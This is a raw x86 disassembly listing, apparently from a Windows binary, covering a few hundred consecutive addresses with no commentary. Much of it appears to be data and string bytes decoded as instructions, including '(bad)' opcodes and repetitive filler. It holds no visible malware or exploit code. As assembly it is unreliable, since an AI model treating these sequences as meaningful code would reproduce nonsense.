  434602:	call   0xff7a4417
  434607:	pushf  
  434608:	inc    esp
  434609:	mov    DWORD PTR [esp],ecx
  43460c:	pop    esi
  43460d:	push   edi
  43460e:	in     eax,0x41
  434610:	ret    0x89
  434613:	and    al,0xe
  434615:	mov    edi,DWORD PTR [eax]
  434617:	and    al,0x75
  434619:	mov    edx,0x7750885
  43461e:	or     dl,bh
  434620:	call   FWORD PTR [ecx+0x3243224]
  434626:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  43462c:	dec    DWORD PTR [esp]
  43462f:	jl     0x4345bc
  434631:	adc    al,0xc
  434633:	dec    ebp
  434634:	cmp    DWORD PTR [ebp+0x1c],esi
  434637:	mov    ecx,DWORD PTR [eax]
  434639:	and    al,0x10
  43463b:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  434642:	test   DWORD PTR [edi],ecx
  434644:	jge    0x434610
  434646:	push   0x8908ff4c
  43464b:	jmp    0x434671
  43464d:	adc    BYTE PTR [esp+eax*2-0x75],dh
  434651:	dec    esp
  434652:	pop    ebp
  434653:	ret    0x8999
  434656:	push   0x74f89cf8
  43465b:	jmp    0x4346d1
  43465d:	mov    edi,0x104fd55f
  434662:	add    BYTE PTR [eax],dh
  434664:	adc    BYTE PTR ds:[eax],al
  434667:	or     edx,DWORD PTR gs:[eax]
  43466a:	add    BYTE PTR [ecx],ch
  43466c:	add    eax,0x35270010
  434671:	adc    BYTE PTR [eax],al
  434673:	std    
  434674:	dec    eax
  434675:	adc    BYTE PTR [eax],al
  434677:	(bad)  
  434678:	outs   dx,BYTE PTR ds:[esi]
  434679:	adc    BYTE PTR [eax],al
  43467b:	sahf   
  43467c:	xor    DWORD PTR [eax],edx
  43467e:	add    BYTE PTR [esi+0x0],al
  434681:	adc    BYTE PTR [eax],al
  434683:	fs jae 0x434696
  434686:	add    BYTE PTR [ebx+0x5f001054],bh
  43468c:	inc    esi
  43468d:	inc    ebx
  43468e:	add    BYTE PTR [ebx+0x46],ah
  434691:	inc    ebx
  434692:	add    BYTE PTR [edi+0x46],ah
  434695:	inc    ebx
  434696:	add    BYTE PTR [ebx+0x46],ch
  434699:	inc    ebx
  43469a:	add    BYTE PTR [edi+0x46],ch
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [ebx+0x46],dh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [edi+0x46],dh
  4346a5:	inc    ebx
  4346a6:	add    BYTE PTR [ebx+0x46],bh
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [edi+0x46],bh
  4346ad:	inc    ebx
  4346ae:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346b4:	inc    esi
  4346b5:	inc    ebx
  4346b6:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  4346bd:	adc    BYTE PTR [eax],al
  4346bf:	adc    dh,BYTE PTR [ecx+0x10]
  4346c2:	add    BYTE PTR [edi+0x2c001065],al
  4346c8:	push   0x5aa20010
  4346cd:	adc    BYTE PTR [eax],al
  4346cf:	rol    DWORD PTR [eax+edx*1],0x0
  4346d3:	int    0x6f
  4346d5:	adc    BYTE PTR [eax],al
  4346d7:	mov    bh,0x46
  4346d9:	inc    ebx
  4346da:	add    BYTE PTR [ebx-0x40ffbcba],bh
  4346e0:	inc    esi
  4346e1:	inc    ebx
  4346e2:	add    bl,al
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx+0x54001005],dh
  4346fc:	push   ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	sbb    bh,BYTE PTR [eax]
  434701:	adc    BYTE PTR [eax],al
  434703:	mov    edx,0x2f001013
  434708:	dec    edx
  434709:	adc    BYTE PTR [eax],al
  43470b:	inc    ecx
  43470c:	or     edx,DWORD PTR [eax]
  43470e:	add    BYTE PTR [ebx+0x19],ch
  434711:	adc    BYTE PTR [eax],al
  434713:	mov    esp,0xf700103e
  434718:	inc    esi
  434719:	inc    ebx
  43471a:	add    bl,bh
  43471c:	inc    esi
  43471d:	inc    ebx
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [edi-0x27ffef96],ch
  43473c:	imul   edx,DWORD PTR [eax],0x0
  43473f:	sahf   
  434740:	push   ss
  434741:	adc    BYTE PTR [eax],al
  434743:	jle    0x43477f
  434745:	adc    BYTE PTR [eax],al
  434747:	jbe    0x43475e
  434749:	adc    BYTE PTR [eax],al
  43474b:	cmp    DWORD PTR [edi+0x10],edx
  43474e:	add    BYTE PTR [ebp+0x59001066],bl
  434754:	adc    al,0x10
  434756:	add    BYTE PTR [edi],dh
  434758:	inc    edi
  434759:	inc    ebx
  43475a:	add    BYTE PTR [ebx],bh
  43475c:	inc    edi
  43475d:	inc    ebx
  43475e:	add    BYTE PTR [edi],bh
  434760:	inc    edi
  434761:	inc    ebx
  434762:	add    BYTE PTR [ebx+0x47],al
  434765:	inc    ebx
  434766:	add    BYTE PTR [edi+0x47],al
  434769:	inc    ebx
  43476a:	add    BYTE PTR [ebx+0x47],cl
  43476d:	inc    ebx
  43476e:	add    BYTE PTR [edi+0x47],cl
  434771:	inc    ebx
  434772:	add    BYTE PTR [ebx+0x47],dl
  434775:	inc    ebx
  434776:	add    BYTE PTR [ebx-0x6affef90],bh
  43477c:	inc    ebp
  43477d:	adc    BYTE PTR [eax],al
  43477f:	dec    ebx
  434780:	dec    eax
  434781:	adc    BYTE PTR [eax],al
  434783:	dec    ebx
  434784:	popa   
  434785:	adc    BYTE PTR [eax],al
  434787:	adc    al,BYTE PTR [eax+edx*1]
  43478a:	add    dh,dl
  43478c:	push   ds
  43478d:	adc    BYTE PTR [eax],al
  43478f:	hlt    
  434790:	pop    ds
  434791:	adc    BYTE PTR [eax],al
  434793:	dec    ecx
  434794:	pop    eax
  434795:	adc    BYTE PTR [eax],al
  434797:	ja     0x4347e0
  434799:	inc    ebx
  43479a:	add    BYTE PTR [ebx+0x47],bh
  43479d:	inc    ebx
  43479e:	add    BYTE PTR [edi+0x47],bh
  4347a1:	inc    ebx
  4347a2:	add    BYTE PTR [ebx-0x78ffbcb9],al
  4347a8:	inc    edi
  4347a9:	inc    ebx
  4347aa:	add    BYTE PTR [ebx-0x70ffbcb9],cl
  4347b0:	inc    edi
  4347b1:	inc    ebx
  4347b2:	add    BYTE PTR [ebx+0x4d004347],dl
  4347b8:	push   edi
  4347b9:	xor    DWORD PTR [ecx],esi
  4347bb:	cmp    BYTE PTR [edi+ebx*2],dh
  4347be:	push   ecx
  4347bf:	add    BYTE PTR [edx+0x33],dl
  4347c2:	push   esi
  4347c3:	xor    eax,0x3849515f
  4347c8:	xor    al,0x59
  4347ca:	push   edi
  4347cb:	add    BYTE PTR [ebx+0x54],al
  4347ce:	inc    ebp
  4347cf:	pop    edi
  4347d0:	dec    ebx
  4347d1:	push   edx
  4347d2:	push   ebp
  4347d3:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  4347d8:	pop    edi
  4347d9:	aaa    
  4347da:	xor    al,0x32
  4347dc:	xor    BYTE PTR [edi+0x5f],al
  4347df:	inc    ebx
  4347e0:	pop    edx
  4347e1:	add    BYTE PTR [edi+0x4e],al
  4347e4:	cmp    DWORD PTR [edi+0x47],ebx
  4347e7:	push   ebx
  4347e8:	cmp    DWORD PTR [edi+0x4e],edx
  4347eb:	add    BYTE PTR [ecx+0x44],dl
  4347ee:	cmp    BYTE PTR [edi+0x33],bl
  4347f1:	cmp    BYTE PTR [eax],dh
  4347f3:	pop    edi
  4347f4:	inc    ecx
  4347f5:	dec    edi
  4347f6:	inc    esi
  4347f7:	push   eax
  4347f8:	add    BYTE PTR [edx+0x43],dl
  4347fb:	xor    eax,0x41305f30
  434800:	xor    BYTE PTR [esi+0x5f],al
  434803:	inc    ebx
  434804:	xor    dh,BYTE PTR [edx]
  434806:	xor    eax,0x36545200
  43480b:	xor    al,0x5f
  43480d:	dec    esi
  43480e:	xor    esi,DWORD PTR [edx]
  434810:	add    BYTE PTR ss:[eax+0x4b],cl
  434814:	inc    ebx
  434815:	pop    edi
  434816:	ss xor al,0x34
  434819:	pop    edi
  43481a:	inc    ecx
  43481b:	push   esp
  43481c:	dec    edi
  43481d:	add    BYTE PTR [esi+0x52],dl
  434820:	push   esi
  434821:	pop    edi
  434822:	inc    esi
  434823:	push   ecx
  434824:	push   ebp
  434825:	push   edx
  434826:	dec    eax
  434827:	add    BYTE PTR [esi+0x41],cl
  43482a:	inc    edx
  43482b:	pop    edi
  43482c:	xor    DWORD PTR [ecx],edi
  43482e:	push   edi
  43482f:	pop    edi
  434830:	pop    edx
  434831:	xor    eax,0x47003934
  434836:	push   edx
  434837:	push   ebp
  434838:	pop    edi
  434839:	xor    al,BYTE PTR [edx+0x30]
  43483c:	push   ebx
  43483d:	dec    esi
  43483e:	xor    eax,0x38564300
  434843:	xor    al,0x5f
  434845:	xor    bl,BYTE PTR [eax+0x36]
  434848:	inc    edx
  434849:	pop    edi
  43484a:	pop    ecx
  43484b:	xor    al,BYTE PTR [ecx+0x0]
  43484e:	push   edi
  43484f:	dec    ecx
  434850:	push   ebx
  434851:	xor    DWORD PTR [eax],edi
  434853:	pop    edi
  434854:	push   ecx
  434855:	xor    BYTE PTR [edx+0x5f],cl
  434858:	inc    ecx
  434859:	add    BYTE PTR ss:[edx+0x45],al
  43485d:	push   edi
  43485e:	cmp    DWORD PTR [eax],edi
  434860:	pop    edi
  434861:	inc    edx
  434862:	xor    eax,0x36520057
  434867:	aaa    
  434868:	xor    BYTE PTR [edi],dh
  43486a:	pop    edi
  43486b:	inc    edx
  43486c:	cmp    DWORD PTR [edi+0x52],eax
  43486f:	dec    esp
  434870:	pop    edi
  434871:	dec    ebx
  434872:	add    BYTE PTR [esp+edx*2+0x30],al
  434876:	pop    edi
  434877:	push   ebp
  434878:	push   ebx
  434879:	aaa    
  43487a:	dec    ebp
  43487b:	pop    edi
  43487c:	xor    ecx,DWORD PTR [edx+0x4e]
  43487f:	dec    ebx
  434880:	dec    edx
  434881:	add    BYTE PTR [edi+0x47],al
  434884:	xor    eax,0x534e5f32
  434889:	push   esp
  43488a:	pop    edi
  43488b:	push   esp
  43488c:	inc    edx
  43488d:	inc    esi
  43488e:	inc    esp
  43488f:	add    BYTE PTR [ebp+0x4e],al
  434892:	inc    edi
  434893:	cmp    DWORD PTR [edi+0x57],ebx
  434896:	push   eax
  434897:	push   ecx
  434898:	pop    edi
  434899:	dec    edi
  43489a:	inc    ebx
  43489b:	push   edi
  43489c:	pop    edi
  43489d:	inc    edi
  43489e:	add    BYTE PTR [edi+0x45],dl
  4348a1:	inc    esi
  4348a2:	pop    edi
  4348a3:	push   edx
  4348a4:	inc    edx
  4348a5:	pop    eax
  4348a6:	inc    edi
  4348a7:	ss pop edi
  4348a9:	push   esi
  4348aa:	inc    ebx
  4348ab:	dec    esi
  4348ac:	inc    esp
  4348ad:	add    BYTE PTR [edi+0x4d],cl
  4348b0:	inc    edi
  4348b1:	xor    ebx,DWORD PTR [edi+0x34]
  4348b4:	dec    esi
  4348b5:	pop    edx
  4348b6:	cmp    BYTE PTR [edi+0x58],bl
  4348b9:	cmp    BYTE PTR [eax],al
  4348bb:	push   edx
  4348bc:	pop    eax
  4348bd:	push   ecx
  4348be:	pop    edi
  4348bf:	dec    esp
  4348c0:	push   edx
  4348c1:	dec    ecx
  4348c2:	dec    edi
  4348c3:	inc    esp
  4348c4:	pop    edi
  4348c5:	dec    edi
  4348c6:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4348ca:	push   eax
  4348cb:	inc    ebp
  4348cc:	pop    edi
  4348cd:	xor    eax,0x565f3945
  4348d2:	add    BYTE PTR [edi+0x4e],al
  4348d5:	push   esi
  4348d6:	pop    edi
  4348d7:	inc    edi
  4348d8:	push   esp
  4348d9:	dec    eax
  4348da:	xor    dh,BYTE PTR [ecx]
  4348dc:	pop    edi
  4348dd:	dec    edi
  4348de:	xor    eax,DWORD PTR ss:[eax]
  4348e1:	inc    esp
  4348e2:	inc    ebp
  4348e3:	dec    ecx
  4348e4:	pop    edi
  4348e5:	push   edx
  4348e6:	dec    eax
  4348e7:	xor    al,0x48
  4348e9:	dec    ecx
  4348ea:	ss pop edi
  4348ec:	aaa    
  4348ed:	aaa    
  4348ee:	dec    ecx
  4348ef:	dec    ebp
  4348f0:	add    BYTE PTR [eax+0x54],cl
  4348f3:	ss pop edi
  4348f5:	inc    esi
  4348f6:	inc    edx
  4348f7:	xor    dh,BYTE PTR [eax+eax*1]
  4348fa:	dec    esi
  4348fb:	ss dec edx
  4348fd:	pop    edi
  4348fe:	dec    ecx
  4348ff:	dec    esp
  434900:	inc    edi
  434901:	inc    esp
  434902:	dec    eax
  434903:	xor    BYTE PTR [eax],bh
  434905:	xor    eax,0x34004f00
  43490a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43490e:	add    BYTE PTR [edi],dh
  434910:	add    BYTE PTR [eax],dh
  434912:	add    BYTE PTR [edi+0x0],bl
  434915:	inc    esp
  434916:	add    BYTE PTR [edi+0x0],al
  434919:	dec    ebx
  43491a:	add    BYTE PTR [edx],dh
  43491c:	add    BYTE PTR [ecx+0x0],al
  43491f:	inc    ebx
  434920:	add    BYTE PTR [eax],al
  434922:	add    BYTE PTR [edi+0x0],cl
  434925:	xor    al,BYTE PTR [eax]
  434927:	xor    eax,DWORD PTR [eax]
  434929:	pop    edi
  43492a:	add    BYTE PTR [edi+0x0],dl
  43492d:	xor    al,BYTE PTR [eax]
  43492f:	dec    edi
  434930:	add    BYTE PTR [edi+0x0],bl
  434933:	pop    edx
  434934:	add    BYTE PTR [eax],al
  434936:	add    BYTE PTR [eax+0x0],bl
  434939:	dec    esp
  43493a:	add    BYTE PTR [ecx],bh
  43493c:	add    BYTE PTR [edi+0x0],bl
  43493f:	dec    ebx
  434940:	add    BYTE PTR [ecx+0x0],al
  434943:	dec    edx
  434944:	add    BYTE PTR [esi+0x0],al
  434947:	xor    DWORD PTR [eax],eax
  434949:	xor    al,0x0
  43494b:	pop    edi
  43494c:	add    BYTE PTR [eax+0x0],bl
  43494f:	inc    edi
  434950:	add    BYTE PTR [edx+0x0],al
  434953:	add    BYTE PTR [eax],al
  434955:	push   eax
  434956:	add    BYTE PTR [ebx],dh
  434958:	add    BYTE PTR [esi+0x0],cl
  43495b:	pop    edi
  43495c:	add    BYTE PTR [eax+0x0],cl
  43495f:	xor    eax,0x5f005300
  434964:	add    BYTE PTR [eax+0x0],cl
  434967:	add    BYTE PTR [eax],al
  434969:	dec    ebp
  43496a:	add    BYTE PTR [eax],dh
  43496c:	add    BYTE PTR [edx+0x0],al
  43496f:	pop    edi
  434970:	add    BYTE PTR [edx+0x0],cl
  434973:	pop    eax
  434974:	add    BYTE PTR [eax+eax*1+0x49],dl
  434978:	add    BYTE PTR [eax+eax*1+0x39],cl
  43497c:	add    BYTE PTR [eax+eax*1+0x0],cl
  434980:	add    BYTE PTR [ecx+0x0],al
  434983:	xor    eax,DWORD PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	pop    edi
  434988:	add    BYTE PTR [ecx+0x0],al
  43498b:	pop    edx
  43498c:	add    BYTE PTR [ecx+0x0],dl
  43498f:	pop    edx
  434990:	add    BYTE PTR [ecx],bh
  434992:	add    BYTE PTR [esi],dh
  434994:	add    BYTE PTR [edi+0x0],bl
  434997:	dec    eax
  434998:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43499c:	add    BYTE PTR [eax],al
  43499e:	add    BYTE PTR [ecx+0x0],dl
  4349a1:	push   edi
  4349a2:	add    BYTE PTR [ecx+0x0],bl
  4349a5:	pop    edi
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	xor    al,0x0
  4349ab:	inc    esp
  4349ac:	add    BYTE PTR [ecx],dh
  4349ae:	add    BYTE PTR [eax],bh
  4349b0:	add    BYTE PTR [edx],dh
  4349b2:	add    BYTE PTR [edi+0x0],bl
  4349b5:	cmp    DWORD PTR [eax],eax
  4349b7:	push   esp
  4349b8:	add    BYTE PTR [eax+eax*1+0x0],dl
  4349bc:	add    BYTE PTR [esi+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [edi+0x0],al
  4349c3:	add    BYTE PTR ss:[edi+0x0],bl
  4349c7:	dec    edi
  4349c8:	add    BYTE PTR [edx+0x0],bl
  4349cb:	inc    ebp
  4349cc:	add    BYTE PTR [eax],dh
  4349ce:	add    BYTE PTR [ebp+0x0],al
  4349d1:	xor    BYTE PTR [eax],al
  4349d3:	pop    edi
  4349d4:	add    BYTE PTR [eax],dh
  4349d6:	add    BYTE PTR ds:0x4f000000,dh
  4349dc:	add    BYTE PTR ds:0x5f005700,dh
  4349e2:	add    BYTE PTR [edi],dh
  4349e4:	add    BYTE PTR [ebx+0x0],dl
  4349e7:	push   ebp
  4349e8:	add    BYTE PTR [edi+0x0],al
  4349eb:	xor    al,0x0
  4349ed:	pop    edi
  4349ee:	add    BYTE PTR [ecx+0x0],dl
  4349f1:	inc    esp
  4349f2:	add    BYTE PTR [eax],al
  4349f4:	add    BYTE PTR [edx+0x0],dl
  4349f7:	push   esp
  4349f8:	add    BYTE PTR ds:0x52005f00,dh
  4349fe:	add    BYTE PTR [edi+0x0],dl
  434a01:	xor    al,BYTE PTR [eax]
  434a03:	xor    al,BYTE PTR [eax]
  434a05:	xor    BYTE PTR [eax],al
  434a07:	xor    BYTE PTR [eax],al
  434a09:	pop    edi
  434a0a:	add    BYTE PTR [esi],dh
  434a0c:	add    BYTE PTR [eax],al
  434a0e:	add    BYTE PTR [eax+0x0],cl
  434a11:	inc    ebp
  434a12:	add    BYTE PTR [eax+eax*1+0x30],cl
  434a16:	add    BYTE PTR [edi+0x0],bl
  434a19:	dec    edx
  434a1a:	add    BYTE PTR [edx],dh
  434a1c:	add    BYTE PTR [edi],dh
  434a1e:	add    BYTE PTR [ebp+0x0],dl
  434a21:	add    BYTE PTR ss:[eax],dh
  434a24:	add    BYTE PTR [eax],al
  434a26:	add    BYTE PTR [esi+0x0],dl
  434a29:	cmp    BYTE PTR [eax],al
  434a2b:	dec    edi
  434a2c:	add    BYTE PTR [ecx],bh
  434a2e:	add    BYTE PTR [edi+0x0],bl
  434a31:	pop    eax
  434a32:	add    BYTE PTR [edx+0x0],bl
  434a35:	dec    esp
  434a36:	add    BYTE PTR [ebx+0x0],cl
  434a39:	add    BYTE PTR [eax],al
  434a3b:	dec    ecx
  434a3c:	add    BYTE PTR [ebp+0x0],dl
  434a3f:	dec    edi
  434a40:	add    BYTE PTR [eax],al
  434a42:	add    BYTE PTR [edx+0x53],dl
  434a45:	inc    esp
  434a46:	push   ebx
  434a47:	sbb    eax,0x504879b8
  434a4c:	inc    dh
  434a4e:	inc    esp
  434a4f:	lods   eax,DWORD PTR ds:[esi]
  434a50:	or     ah,BYTE PTR [esi+esi*8-0x792ca068]
  434a57:	sbb    al,BYTE PTR [eax]
  434a59:	add    BYTE PTR [eax],al
  434a5b:	push   ebx
  434a5c:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  434a60:	jne    0x434adb
  434a62:	ins    DWORD PTR es:[edi],dx
  434a63:	dec    ecx
  434a64:	jb     0x434ae0
  434a66:	pop    esp
  434a67:	bound  di,DWORD PTR [edx+0x52]
  434a6b:	gs fs push ax
  434a6f:	arpl   WORD PTR [esi+0x5c],si
  434a72:	js     0x434ace
  434a74:	je     0x434abd
  434a76:	jno    0x434aba
  434a78:	jno    0x434ae1
  434a7a:	bound  ebp,QWORD PTR [esi]
  434a7c:	jo     0x434ae2
  434a7e:	bound  eax,QWORD PTR [eax]
	...
